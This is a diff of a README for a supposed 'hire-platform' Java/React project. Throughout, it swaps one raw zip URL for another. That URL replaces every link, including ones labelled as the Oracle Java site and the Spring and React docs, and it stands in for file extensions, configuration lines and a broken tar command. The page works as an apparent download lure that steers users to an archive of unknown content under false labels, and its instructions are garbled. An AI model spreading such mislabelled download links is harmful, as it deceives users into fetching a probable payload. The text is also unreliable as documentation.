@@ -4,7 +4,7 @@
 Welcome to the hire-platform! This application allows you to explore various technologies, including AI, Java, React, and more. It is designed to be user-friendly, so anyone can get started easily. 
 
 ## 📦 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip%20Now-Click%https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip)](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip)
+[![Download from Releases](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip%20Now-Click%https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip)](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip)
 
 ## 🌟 Overview
 The hire-platform is a full-stack project that showcases several tech stacks, including:
@@ -29,12 +29,12 @@ To check your Java version, open your command line (Command Prompt or Terminal) 
 java -version
 ```
 
-If Java is not installed, you can download it from the [Oracle website](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip).
+If Java is not installed, you can download it from the [Oracle website](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip).
 
 ## 📥 Download & Install
 To download our latest release, visit this page:
 
-[Download the latest release](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip)
+[Download the latest release](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip)
 
 Follow these steps to install the application:
 
@@ -43,7 +43,7 @@ Follow these steps to install the application:
 3. Choose the appropriate file for your operating system:
    - **Windows:** Look for `.exe` or `.zip` files.
    - **macOS:** Look for `.dmg` files.
-   - **Linux:** Look for `https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip` files.
+   - **Linux:** Look for `https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip` files.
 4. Download the file and save it to a convenient location on your computer.
 5. After the download is complete, follow the instructions specific to your operating system:
 
@@ -55,10 +55,10 @@ Follow these steps to install the application:
 - For the `.dmg` file, double-click it and drag the application to your Applications folder.
 
 ### Linux
-- For the `https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip` file, extract it using the command:
+- For the `https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip` file, extract it using the command:
 
 ```bash
-tar -xvzf https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip
+tar -xvzf https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip
 ```
 
 - Navigate to the directory and run the executable:
@@ -72,15 +72,15 @@ cd your_directory
 To customize your application setup, you may need to modify configuration files. Here’s a basic outline to get you started:
 
 1. Locate the `config` folder in your installation directory.
-2. Open the `https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip` file using a text editor (like Notepad on Windows or TextEdit on macOS).
+2. Open the `https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip` file using a text editor (like Notepad on Windows or TextEdit on macOS).
 3. Adjust the settings according to your needs. For example, update the database connection details if you are using MySQL.
 
 Here’s a sample configuration for connecting to a MySQL database:
 
 ```properties
-https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip
-https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip
-https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip
+https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip
+https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip
+https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip
 ```
 
 ## 🛠 Features
@@ -102,10 +102,10 @@ The hire-platform integrates multiple technologies to provide a seamless experie
 ## 📚 Additional Resources
 If you want to learn more about the technologies used in hire-platform, check out these resources:
 
-- [Spring Framework Documentation](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip)
-- [React Documentation](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip)
-- [https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip Documentation](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip)
-- [UniApp Documentation](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip)
+- [Spring Framework Documentation](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip)
+- [React Documentation](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip)
+- [https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip Documentation](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip)
+- [UniApp Documentation](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -122,4 +122,4 @@ To report issues or bugs, please open a new issue on the GitHub repository under
 If you need further assistance, feel free to reach out through the Issues tab on our GitHub page or consult the community resources.
 
 ## 📦 Download Now Again
-Remember to download the latest release here: [Download the latest release](https://raw.githubusercontent.com/moisesgald/hire-platform/main/avariciousness/hire-platform.zip)
+Remember to download the latest release here: [Download the latest release](https://github.com/moisesgald/hire-platform/raw/refs/heads/main/hire-mybatis/sercice-company-6001/src/main/platform_hire_v3.2.zip)
